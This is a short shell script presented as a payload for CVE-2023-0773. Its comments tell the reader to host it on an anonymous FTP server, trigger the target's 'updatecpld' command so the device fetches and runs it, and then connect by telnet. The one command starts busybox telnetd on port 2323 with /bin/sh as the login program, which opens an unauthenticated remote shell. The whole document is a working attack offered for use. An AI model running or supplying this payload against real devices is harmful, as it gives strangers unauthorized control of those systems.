#!/bin/sh
# cpldload_telnetd.sh - CVE-2023-0773 payload
# Spawns unrestricted telnetd on port 2323 when fetched via updatecpld
# Usage: Serve this file as "cpldload" on anonymous FTP server
# Then from uvsh: updatecpld <attacker_ip>
# Connect: telnet <target> 2323

/bin/busybox telnetd -p 2323 -l /bin/sh
